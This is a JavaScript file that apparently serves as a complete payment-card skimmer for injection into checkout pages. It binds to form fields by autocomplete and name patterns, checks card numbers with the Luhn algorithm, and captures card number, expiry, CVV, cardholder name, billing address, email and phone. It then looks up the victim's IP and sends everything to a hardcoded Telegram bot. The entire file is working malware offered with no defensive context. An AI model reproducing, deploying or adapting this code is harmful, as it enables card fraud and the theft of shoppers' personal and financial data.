(() => {
  if (window.__skim_injected) return;
  window.__skim_injected = true;

  const TG_TOKEN = '8803578308:AAEyRXKJAD-dILkOJKdZv9ungSRrpH6Txiw';
  const TG_CHAT  = '8241854538';

  const S = {
    sid: Math.random().toString(36).slice(2, 14),
    fields: {},
    sent: new Set(),
    timer: null,
  };

  const esc = s => String(s || '')
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

  const brandOf = n => {
    n = String(n || '').replace(/\D/g, '');
    if (/^4/.test(n)) return 'VISA';
    if (/^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[01]|2720)/.test(n)) return 'MASTERCARD';
    if (/^3[47]/.test(n)) return 'AMEX';
    if (/^6(?:011|5)/.test(n)) return 'DISCOVER';
    if (/^3(?:0[0-5]|[68])/.test(n)) return 'DINERS';
    if (/^35/.test(n)) return 'JCB';
    if (/^62/.test(n)) return 'UNIONPAY';
    return 'CARD';
  };

  const luhn = n => {
    n = String(n||'').replace(/\D/g,'');
    if (n.length < 12 || n.length > 19) return false;
    let s=0, alt=false;
    for (let i=n.length-1;i>=0;i--){ let d=+n[i]; if (alt){d*=2; if(d>9)d-=9;} s+=d; alt=!alt; }
    return s%10===0;
  };

  const AC_MAP = {
    'cc-number': 'cc_number', 'cc-exp': 'cc_exp', 'cc-exp-month': 'cc_exp',
    'cc-exp-year': 'cc_exp', 'cc-csc': 'cc_cvv', 'cc-cvv': 'cc_cvv',
    'cc-name': 'cc_name', 'cc-given-name': 'cc_name', 'cc-family-name': 'cc_name',
    'street-address': 'billing', 'address-line1': 'billing',
    'address-level2': 'city', 'address-level1': 'state',
    'postal-code': 'zip', 'country': 'country', 'country-name': 'country',
    'email': 'email', 'tel': 'phone', 'tel-national': 'phone',
  };

  const PATTERNS = [
    { k: 'cc_number', re: /(card[-_]?number|cc[-_]?num|ccnumber|cardnumber|cc[-_]?no|creditcard|card[-_]?no|pan|acct[-_]?no|payment[-_]?number|account[-_]?number)/i },
    { k: 'cc_exp',    re: /(exp|expiry|expiration|exp[-_]?date|exp[-_]?month|exp[-_]?year|mm[-_]?yy|valid[-_]?thru|good[-_]?thru)/i },
    { k: 'cc_cvv',    re: /(cvv|cvc|cvn|csc|security[-_]?code|card[-_]?code|cvc2|verification[-_]?value)/i },
    { k: 'cc_name',   re: /(card[-_]?holder|cardholder|cc[-_]?name|name[-_]?on[-_]?card)/i },
    { k: 'billing',   re: /(billing|address|street|line1|addr1)/i },
    { k: 'city',      re: /(city|town)/i },
    { k: 'zip',       re: /(zip|postal|postcode)/i },
    { k: 'state',     re: /(state|province|region)/i },
    { k: 'country',   re: /(country)/i },
    { k: 'email',     re: /(email|e-mail)/i },
    { k: 'phone',     re: /(phone|tel|mobile)/i },
  ];

  const meta = el => {
    if (!el) return '';
    const g = n => (el.getAttribute && el.getAttribute(n)) || '';
    return [el.name, el.id, el.className, el.placeholder, el.type,
      g('autocomplete'), g('data-testid'), g('data-test-id'), g('data-qa'),
      g('aria-label'), g('formcontrolname'), g('ng-model'), g('v-model'),
      g('data-field'), g('data-name')].filter(Boolean).join(' ');
  };

  const match = el => {
    if (!el) return null;
    const ac = (el.getAttribute && el.getAttribute('autocomplete') || '').toLowerCase().trim();
    if (ac && AC_MAP[ac]) return AC_MAP[ac];
    const m = meta(el);
    for (const p of PATTERNS) if (p.re.test(m)) return p.k;
    if (el.value) {
      const d = String(el.value).replace(/\D/g,'');
      if (d.length >= 12 && d.length <= 19 && luhn(d)) return 'cc_number';
    }
    return null;
  };

  const capture = (el, k) => {
    if (!el || !k) return;
    let v = el.value;
    if (v == null) return;
    v = String(v).trim();
    if (!v) return;
    if (k === 'cc_number' && !luhn(v)) return;
    if (k === 'cc_cvv' && !/^\d{3,4}$/.test(v)) return;
    if (S.fields[k] === v) return;
    S.fields[k] = v;
    schedule();
  };

  const bind = el => {
    if (!el || el.__skim_b) return;
    const k = match(el);
    if (!k) return;
    el.__skim_b = true;
    ['input','change','blur','keyup','paste'].forEach(ev =>
      el.addEventListener(ev, () => capture(el, k), true));
    if (el.value) capture(el, k);
  };

  const scan = root => {
    if (!root || !root.querySelectorAll) return;
    try {
      root.querySelectorAll('input, select, textarea').forEach(bind);
      root.querySelectorAll('*').forEach(el => {
        if (el.shadowRoot) scan(el.shadowRoot);
      });
    } catch(_){}
  };

  try {
    new MutationObserver(muts => {
      for (const m of muts) {
        if (!m.addedNodes) continue;
        for (const n of m.addedNodes) {
          if (n.nodeType !== 1) continue;
          if (/^(INPUT|SELECT|TEXTAREA)$/.test(n.tagName)) bind(n);
          scan(n);
        }
      }
    }).observe(document.documentElement, { childList: true, subtree: true });
  } catch(_){}

  document.addEventListener('submit', e => {
    const f = e.target;
    if (f && f.querySelectorAll)
      f.querySelectorAll('input, select, textarea').forEach(el => capture(el, match(el)));
    flush();
  }, true);

  document.addEventListener('click', e => {
    const t = e.target;
    if (!t) return;
    const tag = (t.tagName||'').toLowerCase();
    if (tag !== 'button' && tag !== 'input' && tag !== 'a') return;
    const txt = ((t.innerText||t.value||'')+'').toLowerCase();
    if (/(pay|submit|checkout|place|order|confirm|buy|purchase|place order)/.test(txt)) {
      setTimeout(() => { scan(document); flush(); }, 300);
    }
  }, true);

  const formatHit = (f, m) => {
    const num = (f.cc_number || '').replace(/\D/g, '');
    const b = brandOf(num);
    const L = [];
    if (f.cc_number) L.push(`💳 <b>${b}</b>  <code>${esc(f.cc_number)}</code>`);
    if (f.cc_exp || f.cc_cvv)
      L.push(`📅 exp <code>${esc(f.cc_exp || '—')}</code>  🔒 cvv <code>${esc(f.cc_cvv || '—')}</code>`);
    if (f.cc_name) L.push(`👤 ${esc(f.cc_name)}`);
    if (f.billing) L.push(`🏠 ${esc(f.billing)}`);
    if (f.zip)     L.push(`📮 ${esc(f.zip)}`);
    if (f.email)   L.push(`📧 <code>${esc(f.email)}</code>`);
    if (f.phone)   L.push(`📞 ${esc(f.phone)}`);
    L.push('', `🌐 ${esc(m.url)}`, `🆔 <code>${esc(m.sid)}</code>`);
    if (m.ip) L.push(`📡 IP: <code>${esc(m.ip)}</code>`);
    if (m.ua) L.push(`🖥 UA: <code>${esc(m.ua)}</code>`);
    return L.join('\n');
  };

  const safeFetch = (url, opts) => {
    try { return fetch(url, opts).catch(() => null); }
    catch (_) { return Promise.resolve(null); }
  };

  const send = async force => {
    const num = (S.fields.cc_number || '').replace(/\D/g,'');
    if (Object.keys(S.fields).length === 0) return;
    if (force) {
      if (num.length === 0 && !S.fields.email && !S.fields.phone) return;
    } else {
      if (num.length < 12) return;
    }
    const key = JSON.stringify(S.fields);
    if (S.sent.has(key) && !force) return;
    S.sent.add(key);

    let ip = '';
    const r = await safeFetch('https://api.ipify.org?format=json');
    if (r) { try { const j = await r.json(); ip = j.ip || ''; } catch(_){} }

    const text = formatHit(S.fields, {
      url: location.host + location.pathname,
      sid: S.sid,
      ip,
      ua: navigator.userAgent,
    });

    await safeFetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML',
        disable_web_page_preview: true, disable_notification: false }),
    });
  };

  const flush = () => {
    if (S.timer) { clearTimeout(S.timer); S.timer = null; }
    send(true);
  };

  const schedule = () => {
    if (S.timer) clearTimeout(S.timer);
    S.timer = setTimeout(() => send(false), 900);
  };

  scan(document);
  setTimeout(() => scan(document), 1500);
  setTimeout(() => scan(document), 4000);
})();
